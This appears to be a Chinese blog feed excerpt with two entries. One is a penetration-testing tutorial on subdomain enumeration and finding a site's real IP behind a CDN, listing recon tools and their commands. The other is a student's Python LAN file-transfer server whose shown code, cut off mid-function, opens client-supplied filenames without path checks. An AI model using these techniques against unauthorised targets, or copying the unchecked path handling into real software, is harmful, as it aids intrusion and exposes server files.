    <content type="html"><![CDATA[<h2 id="子域名深度挖掘"><a href="#子域名深度挖掘" class="headerlink" title="子域名深度挖掘"></a>子域名深度挖掘</h2><p>[TOC]</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h3><p>企业可能有多个、几十个甚至很多的子域名应用，因为子域名数量多，企业在人员和防护的投入可能会没有主站及时。攻击者在主域名找不到突破口时，就可以进行子域名的信息收集，然后通过子域名的漏洞进行迂回。</p><p><del>例如:<a href="http://www.qfnu.edu.cn主域不存在漏洞,并且防护措施严密,而二级域名/">www.qfnu.edu.cn主域不存在漏洞，并且防护措施严密，而二级域名</a> jsj.qfnu.edu.cn存在漏洞，防护措施松散，可以采用迂回战术拿下子域名，然后逐步靠近主域。</del></p><blockquote><p style="color:orange;">目的：核心目标久攻不下，从侧面展开攻击并逐步获取核心目标权限</p></blockquote><h3 id="一、前置知识"><a href="#一、前置知识" class="headerlink" title="一、前置知识"></a>一、前置知识</h3><h4 id="1-1-域名类别"><a href="#1-1-域名类别" class="headerlink" title="1.1 域名类别"></a>1.1 域名类别</h4><img src="./子域名深度挖掘/域名分类.png" alt="" style="zoom:50%;" /><center>1-1 域名分类</center>#### 1.2 子域名<p>子域名是在域名系统等级中属于更高一层域的域。比如：jsj.qfnu.edu.cn和da.qfnu.edu.cn是qfnu.edu.cn的两个子域。</p><img src="./子域名深度挖掘/攻击阶段列举.png" style="zoom:80%;" /><center>1-2 渗透测试阶段举例</center>在网络攻防的过程中，信息收集是非常重要的一步， 通过信息收集可以了解渗透目标的网络架构，描述出相关 的网络拓扑，缩小攻击范围。只有将目标的相关信息收集 完整，才可以对攻击目标开启的主机及主机安装运行的应 用，针对性的进行有效攻击。我们要讲的内容子域名深度挖掘实际上只是其中一部分，还有像whois域名注册信息查询，网站后台(敏感/备份文件&目录)扫描，whois查询和反查/IP查询和反查/C段查询， Email信息收集， WEB指纹识别&WEB后台扫描等众多的内容<p>为了保证网络的稳定网站服务商会在网络的不同位置设置节点服务器，通过 CDN技术，将网络请求分发到最优的节点服务器上面。</p><h4 id="1-3-CDN判断与绕过"><a href="#1-3-CDN判断与绕过" class="headerlink" title="1.3 CDN判断与绕过"></a>1.3 CDN判断与绕过</h4><p>当CDN技术成熟时，不只是正常用户部署有CDN，比如服务器部署正国外的<del>不法网站</del>往往会采用国内的CDN，使国内用户访问。</p><blockquote><p style="color:red;">站长工具：http://ping.chinaz.com/</p><p style="color:red;">爱站网：https://ping.aizhan.com/</p><p style="color:red;">国外 ping 探测：https://asm.ca.com/en/ping.php</p></blockquote><p>利用站长工具对<a href="http://www.baidu.com多地探测返回的结果,发现有多达15个不同的ip,www.baidu.com同时有显示cdn提供商为百度云加速,这个应该算理所当然,百度没cdn才属于离谱./">www.baidu.com多地探测返回的结果，发现有多达15个不同的IP,www.baidu.com同时有显示CDN提供商为百度云加速，这个应该算理所当然，百度没CDN才属于离谱。</a></p><h5 id="nslookup域名解析"><a href="#nslookup域名解析" class="headerlink" title="nslookup域名解析"></a>nslookup域名解析</h5><p>通过系统自带的【nslookup】命令对域名解析, 发现有【39.156.66.18】和【39.156.66.14】两个 不同的IP,说明【<a href="http://www.baidu.com】可能使用了cdn./">www.baidu.com】可能使用了CDN。</a></p><h5 id="有CDN例子"><a href="#有CDN例子" class="headerlink" title="有CDN例子"></a>有CDN例子</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># www.abc.com</span><span class="token comment"># 服务器:public1.114dns.com</span><span class="token comment"># Address: 114.114.114.114 </span>非权威应答：<span class="token comment"># 名称:abc.xdwscache.ourglb0.com</span><span class="token comment"># Addresses: 58.223.164.86 125.75.32.252</span><span class="token comment"># Aliases: www.abc.com</span><span class="token comment"># www.abc.com.lxdns.com</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="无CDN例子"><a href="#无CDN例子" class="headerlink" title="无CDN例子"></a>无CDN例子</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php">abc<span class="token operator">.</span>com服务器<span class="token punctuation">:</span>public1<span class="token operator">.</span><span class="token number">114</span>dns<span class="token operator">.</span>comAddress<span class="token punctuation">:</span> <span class="token number">114.114</span><span class="token number">.114</span><span class="token number">.114</span>非权威应答：名称<span class="token punctuation">:</span>abc<span class="token operator">.</span>comAddress<span class="token punctuation">:</span> <span class="token number">192.12</span><span class="token number">.168</span><span class="token number">.172</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-4-绕过CDN获取真实IP"><a href="#1-4-绕过CDN获取真实IP" class="headerlink" title="1.4 绕过CDN获取真实IP"></a>1.4 绕过CDN获取真实IP</h4><h5 id="查询子域名"><a href="#查询子域名" class="headerlink" title="查询子域名"></a>查询子域名</h5><blockquote><p style="color:skyblue;">子域名可能跟主站在同一个服务 器或者同一个C段网络中，可以通过子 域名探测的方式，收集目标的子域名 信息,通过查询子域名的IP信息来辅助 判断主站的真实IP信息。</p></blockquote><p>作用：IP/域名-&gt;同网段下的IP<br>通过IP或域名可以查询同网段的不同IP ，查询手段：webscan或其他工具   <a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p><h5 id="使用国外主机解析域名"><a href="#使用国外主机解析域名" class="headerlink" title="使用国外主机解析域名"></a>使用国外主机解析域名</h5><p>探测的方式也有两种，一种是利用 自己已有的境外的主机直接进行探测, 另一种如果没有国外主机可以利用公开的多地ping服务，多地ping服务有国外的探测节点，可以利用国外节点的返回信息来判断真实的IP信息。</p><h5 id="网站漏洞"><a href="#网站漏洞" class="headerlink" title="网站漏洞"></a>网站漏洞</h5><p>利用网站存在的漏洞，信息泄露的敏感信息、文件，如phpinfo文件、网站源码文件、Github泄露的信息等都可能会将真实的IP信息泄露。</p><p>邮件的信息中会记录邮件服务器的IP信息，有些站点有类似于RSS邮件订阅可以发送邮件的功能，可以利用其发送的邮件，通过查看源码的方式查看真实服务器的IP信息。</p><img src="./子域名深度挖掘/获取子域名的方式.png" style="zoom:67%;" /><center><p>1-3  获取子域名的方式</p></center>### 二、挖掘工具<h4 id="2-1子域名挖掘手段"><a href="#2-1子域名挖掘手段" class="headerlink" title="2.1子域名挖掘手段"></a>2.1子域名挖掘手段</h4><ul><li>DNS域传送漏洞发现子域名（这个漏洞比较早现在已经有很少应用）</li><li>搜索引擎发现子域名</li><li>证书透明性信息发现子域名</li><li>第三方聚合服务发现子域名</li><li>子域名枚举发现子域名</li></ul><h4 id="2-2-DNS域传送"><a href="#2-2-DNS域传送" class="headerlink" title="2.2 DNS域传送"></a>2.2 DNS域传送</h4><p>作为重要的互联网基础设施，难免成为黑客的重点攻击目标，服务的稳定性尤为重要。DNS服务器分为：主服务器、备份服务器和缓存服务器。在主备服务器之间同步数据库，需要使用“DNS域传送”。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库<br>若DNS服务器配置不当，可能导致匿名用户获取某个域的所有记录。造成整个网络的拓扑结构泄露给潜在的攻击者，包括一些安全性较低的内部主机，如测试服务器。凭借这份网络蓝图，攻击者可以节省很少的扫描时间。<br>大的互联网厂商通常将内部网络与外部互联网隔离开，一个重要的手段是使用Private DNS。如果内部DNS泄露，将造成极大的安全风险。风险控制不当甚至造成整个内部1网络沦陷。<br>当然这个漏洞非常鸡肋，只有大公司会用Private DNS服务器，但是一个古老漏洞，会出现问题的可能性不大。</p><h4 id="2-3-搜索引擎发现子域名"><a href="#2-3-搜索引擎发现子域名" class="headerlink" title="2.3 搜索引擎发现子域名"></a>2.3 搜索引擎发现子域名</h4><blockquote><p style="color:blue;">搜索语法：site:baidu.com</p></blockquote><p>site语法设定的初衷是为了实现精准搜索。索引结果数不是一个网站在搜索引擎中的站点评级指标。搜索结果中URL后面的时间戳不必太过关注。site语法查询的检索结果只能说明网页被收录。<br>site：后面带不带www结果可能是不一样的，因为有些域名还包括二级域名，如：site：www。某某。com和site：某某。com，搜索结果就不一样，site：和站点名之间，不要带空格。</p><p><strong>搜索引擎发现子域名（拓展）</strong></p><blockquote><p>url前不能带http:// , 现在Google搜索可以带http:// Google会自动忽略，百度依然不能忽略带”http://“的搜索。</p></blockquote><blockquote><p>搜索引擎 site:<a href="http://www.sina.com.cn/">http://www.sina.com.cn</a></p></blockquote><p style="color:red;">Google结果：所有网站 www.sina. com.cn 上约有1660项符合 搜索引擎的查询结果，以下是第 1 - 10 项。Baidu结果：抱歉，没有找到与“site:ht tp://finance.sina.com.cn” 相关的网页。</p>> 搜索引擎：site:www.sina.com.cn<p>Google结果：所有网站 <a href="http://www.sina.com.cn/">www.sina.com.cn</a> 上约有1660项符合 搜索引擎的查询结果，以下是第 1 - 10 项。<br>Baidu结果：百度一下，找到相关网页约3,210篇，用时0.057秒。B、在过去url后边不能带斜杠“/”，现在Google和Baidu都可以带”/“。</p><p>比如说：https: //crt.sh/ 与 https ://censys.io/</p><p style="color:orange;">因为证书透明性只能查到有证书的网站，所以这里获取的域名一般没问题，而且数量较少。证书透明性获取的子域名数量其实远小于通过搜索引擎获取，一般是作为一些补充。</p>#### 2.4 枚举工具<h5 id="one-for-all"><a href="#one-for-all" class="headerlink" title="one for all"></a>one for all</h5><p>下载地址：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a><br>一款集百家之长，功能强大的全面快速子域收集终极神器，收集子域名快速且全面，但要注意一定要配置API，否 则收集的子域名会不够全。<br>注意：这个建议在虚拟机运行，直接用kali linux开个docker把环境加载进去就行。</p><h5 id="Layer子域名挖掘机"><a href="#Layer子域名挖掘机" class="headerlink" title="Layer子域名挖掘机"></a>Layer子域名挖掘机</h5><p>下载地址：<a href="https://github.com/euphrat1ca/LayerDomainFinder">https://github.com/euphrat1ca/LayerDomainFinder</a><br>这个地址下载到的其实是说这个攻击的源代码，如我在课下会把这个工具的正常使用版本放在群里。</p><h5 id="JSFinder"><a href="#JSFinder" class="headerlink" title="JSFinder"></a>JSFinder</h5><p>下载地址：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a> ,一款用作快速在网站的js文件中提取URL，子域名的工具。<br>Knock Subdomain Scan v5.3.0<br>下载地址：<a href="https://github.com/guelfoweb/knock">https://github.com/guelfoweb/knock</a> ,通过字典攻击快速枚举目标域上的子域</p><h5 id="one-for-all-1"><a href="#one-for-all-1" class="headerlink" title="one for all"></a>one for all</h5><p>下载地址：<a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a> </p><blockquote><p>OneForAll基于Python 3.6.0开发和测试，OneForAll需要高于Python 3.6.0的版本才能运行。 安装Python环境可以参考Python 3 安装指南。运行以下命令检查Python和pip3版本：<br>首先下载并编辑配置文件，添加自己的api和个性化设置，并保留原始文件结构<br>config ├ ── api.py ├ ── log.py └── setting.py<br>拉取镜像并执行，其中<del>/.config替换为你自己配置文件所在文件夹的路径<br>docker pull shmilylty/oneforall<br>docker run -it –rm -v ~/results:/OneForAll/results -v ~/.config:/OneForAll/config shmilylty/oneforall –target example.com run<br>参数直接加在指令末尾，结果会输出在本地目录</del>/results，如需保存到其他位置，可以自行修改。<br>如果你是通过pip3安装的依赖则使用以下命令运行示例：<br>python3 oneforall.py –target example.com run<br>python3 oneforall.py –targets ./example.txt run</p></blockquote><h3 id="三、实战演练"><a href="#三、实战演练" class="headerlink" title="三、实战演练"></a>三、实战演练</h3><h3 id="四、总结答疑"><a href="#四、总结答疑" class="headerlink" title="四、总结答疑"></a>四、总结答疑</h3><blockquote><p style="color:red;">本课程及所讲述的所有技术仅能在取得足够合法授权的企业安全建设中使用，在使用学习本课程的过程中，您应确保自己所有行为符合当地的法律法规。 如您在学习本课程后中存在任何非法行为，您将自行承担所有后果，本课程所有开发者和所有贡献者不承担任何法律及连带责任。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要阅读本课程。 您的阅读行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;子域名深度挖掘&quot;&gt;&lt;a href=&quot;#子域名深度挖掘&quot; class=&quot;headerlink&quot; title=&quot;子域名深度挖掘&quot;&gt;&lt;/a&gt;子域名深度挖掘&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerl</summary>
      
    
    
    
    <category term="网络安全" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="信息收集" scheme="https://shierjinghuang.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="网络安全" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络实训之简单文件传输系统器</title>
    <link href="https://shierjinghuang.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%99%A8/"/>
    <id>https://shierjinghuang.github.io/2022/09/08/%E7%AE%80%E5%8D%95%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%99%A8/</id>
    <published>2022-09-08T01:02:28.000Z</published>
    <updated>2025-03-27T08:01:13.435Z</updated>
    
    <content type="html"><![CDATA[<p>只能说计算机网络实训那一周我是真的难受，不仅仅有我自己的实训任务还有别人的，自己这个任务一实际上是第一天就写完了的，大部分的时间是在做网络的一些内容，以及同组其他成员的可视化。</p><hr><p>[TOC]</p><h2 id="简单文件传输系统器"><a href="#简单文件传输系统器" class="headerlink" title="简单文件传输系统器"></a>简单文件传输系统器</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>本文件传输系统为一款实现内网文件传输的类FTP协议软件，由Python语言开发。客户端程序与服务器端程序分别运行局域网内不同主机上，实现客户端与服务器端的文件传输功能。</p><h3 id="服务器界面："><a href="#服务器界面：" class="headerlink" title="服务器界面："></a>服务器界面：</h3><center><img src="./简单文件传输器/wps1.jpg"style="zoom:80%;" /><center> <center>图1-1 文件传输系统服务端</center>该界面包括开始等待下载按钮和选择共享文件夹按钮。<p>本程序是一款通过服务器客户端的方式实现一个类FTP协议下载功能的应用软件。</p><center><img src="./简单文件传输器/wps2.jpg" style="zoom:80%;" /> </center><center>图1-2 共享文件夹选择页面</center>点击选择共享文件夹按钮后，路径选择界面，选择文件夹作为共享文件夹，客户端可以自由获取该文件夹下的文件。同时服务器端会读取当前共享文件夹路径下的所有文件名，写入文件菜单.txt中。<p>在选择好共享文件后，点击开始等待下载，程序通过点击，服务器进入被动等待，同时服务器会进行弹窗展示自己的IP地址（内网地址）</p><center><img src="./简单文件传输器/wps3.jpg" style="zoom:80%;" /> </center><center>图1-3 弹窗显示服务器内网IP地址</center>在此之后，服务器端将等待客户端与其建立连接，连接建立后将持续等待客户端发送文件下载请求，但同一时间只能与一个客户端建立连接。<h3 id="客户端界面"><a href="#客户端界面" class="headerlink" title="客户端界面"></a>客户端界面</h3><p>首先运行客户端后，会进入客户端页面，如图2-1所示。 </p><center><img src="./简单文件传输器/wps4.jpg" style="zoom:80%;" /> </center><center>图2-1 客户端页面</center>该界面包括对应的服务器IP地址输入栏，文件输入栏。还有下载按钮和文件存放地址设置按钮。在服务器开启后依次输入输入服务器IP地址，与需要下载的文件，设置文件存放地址，点击下载程序将自动链接服务器，下载需下载的文件。<p>执行程序时，应先下载文件菜单.txt文件，以获悉共享文件夹下的内容。</p><p>当文件完成下载时会进行弹窗提示，用户可继续通过当前客户端下载服务器共享文件夹下的其他文件。</p><center><img src="./简单文件传输器/wps5.jpg" style="zoom:80%;" /> </center><center>图2-2文件下载完成后的相应提示</center>### 开发环境<p>本项目使用Python语言开发，使用 PyCharm编译器进行开发。使用WxPython库进行可视化界面制作，同时以socket,Json，struct等支持库进行服务器与客户端的链接。</p><p>在开发过程中，客户端程序与服务器端程序分开进行开发。</p><h3 id="使用注意事项"><a href="#使用注意事项" class="headerlink" title="使用注意事项"></a>使用注意事项</h3><ol><li><p>在使用时请在服务器地址下放置需要客户端下载的内容</p></li><li><p>由于使用支持库socket的限制，本程序只能实现在同一子网下不同主机间的通信，无法实现对内网的穿透实现外网通信。</p></li><li><p>由于windows计算机防火墙的存在，在设计传输程序的过程中，一直选用8000端口作为通信端口，同时手动开启服务器该端口号，只有服务器固定端口号打开时程序才能顺利运行。</p></li><li><p>客户端输入IP地址应为局域网内的内网地址，即程序运行过程中服务器端提示地址（原因见注意事项1）。</p></li><li><p>在实际应用时，进行了一些简单的过滤，避免客户端通过简单注入即可危害服务器信息安全（读取到不应读取的内容）。</p></li></ol><h3 id="服务器代码："><a href="#服务器代码：" class="headerlink" title="服务器代码："></a>服务器代码：</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> struct  <span class="token comment"># 制作报头的模块</span><span class="token keyword">import</span> json   <span class="token comment"># 转换数据格式(序列化)</span><span class="token keyword">import</span> wx<span class="token punctuation">.</span>lib<span class="token punctuation">.</span>agw<span class="token punctuation">.</span>hyperlink <span class="token keyword">as</span> lib_hyperlink<span class="token keyword">import</span> wx<span class="token keyword">import</span> os<span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">getIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_DGRAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"8.8.8.8"</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ip<span class="token operator">=</span>s<span class="token punctuation">.</span>getsockname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> ip<span class="token keyword">class</span> <span class="token class-name">Frame</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>ip<span class="token operator">=</span>getIP<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">)</span>        wx<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'简单文件传输器（服务器）'</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">360</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'frame'</span><span class="token punctuation">,</span>style<span class="token operator">=</span><span class="token number">541072384</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>qdck <span class="token operator">=</span> wx<span class="token punctuation">.</span>Panel<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>Centre<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">190</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">,</span>label<span class="token operator">=</span><span class="token string">'开始等待下载'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an1<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span>self<span class="token punctuation">.</span>an1_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1 <span class="token operator">=</span> wx<span class="token punctuation">.</span>StaticText<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'简单文件传输器'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>                                 style<span class="token operator">=</span><span class="token number">2321</span><span class="token punctuation">)</span>        bq1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">700</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>bq1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>bq1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>port<span class="token operator">=</span><span class="token number">8000</span>        <span class="token comment"># 设置默认端口号为8848 钛合金手机</span>        self<span class="token punctuation">.</span>cjljkL1 <span class="token operator">=</span> lib_hyperlink<span class="token punctuation">.</span>HyperLinkCtrl<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'staticText'</span><span class="token punctuation">,</span>                                                   label<span class="token operator">=</span><span class="token string">'使用说明'</span><span class="token punctuation">,</span>URL<span class="token operator">=</span><span class="token string">'https://im-so-scared-2.gitee.io/shier_jinghuang/'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetToolTip<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>ToolTip<span class="token punctuation">(</span><span class="token string">'使用说明'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        cjljkL1_字体 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Font<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">90</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetFont<span class="token punctuation">(</span>cjljkL1_字体<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>cjljkL1<span class="token punctuation">.</span>SetForegroundColour<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2 <span class="token operator">=</span> wx<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>qdck<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pos<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">,</span> label<span class="token operator">=</span><span class="token string">'选择共享文件夹'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'button'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>Bind<span class="token punctuation">(</span>wx<span class="token punctuation">.</span>EVT_BUTTON<span class="token punctuation">,</span> self<span class="token punctuation">.</span>an2_anbdj<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>an2<span class="token punctuation">.</span>SetAuthNeeded<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>share_dir<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">def</span> <span class="token function">an1_anbdj</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>        toastone <span class="token operator">=</span> wx<span class="token punctuation">.</span>MessageDialog<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"服务器的IP地址为："</span><span class="token operator">+</span>self<span class="token punctuation">.</span>ip<span class="token operator">+</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"IP地址显示"</span><span class="token punctuation">,</span> wx<span class="token punctuation">.</span>YES_DEFAULT <span class="token operator">|</span> wx<span class="token punctuation">.</span>ICON_QUESTION<span class="token punctuation">)</span>        <span class="token keyword">if</span> toastone<span class="token punctuation">.</span>ShowModal<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> wx<span class="token punctuation">.</span>ID_YES<span class="token punctuation">:</span>            <span class="token comment"># 如果点击了提示框的确定按钮</span>            toastone<span class="token punctuation">.</span>Destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># 则关闭提示框</span>        phone <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        phone<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip<span class="token punctuation">,</span> self<span class="token punctuation">.</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>        phone<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            conn<span class="token punctuation">,</span> client <span class="token operator">=</span> phone<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                    <span class="token comment"># 收命令</span>                    res <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8096</span><span class="token punctuation">)</span>                    <span class="token comment"># 解析命令、提取相应的命令参数</span>                    cmds <span class="token operator">=</span> res<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># ['get','a.txt']  split变列表格式</span>                    filename <span class="token operator">=</span> cmds<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>                    <span class="token comment"># 已读的方式打开文件，读取文件内容发送给客户端</span>                    <span class="token comment"># 第一步：制作固定长度的报头</span>                    header_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                        <span class="token string">'filename'</span><span class="token punctuation">:</span> filename<span class="token punctuation">,</span>                        <span class="token string">'file_size'</span><span class="token punctuation">:</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getsize<span class="token punctuation">(</span><span class="token string">r'%s/%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>share_dir<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token comment"># 这里把文件的名字和地址结合在一起得到文件长度</span>                    <span class="token punctuation">&#125;</span>  <span class="token comment"># 字典方便储存数据</span>                    header_json <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>header_dic<span class="token punctuation">)</span>  <span class="token comment"># 把字典转换成js格式(字符串类型)</span>                    header_bytes <span class="token operator">=</span> header_json<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">)</span>                    <span class="token comment"># 第二步：先发送报头的长度</span>                    conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>header_bytes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        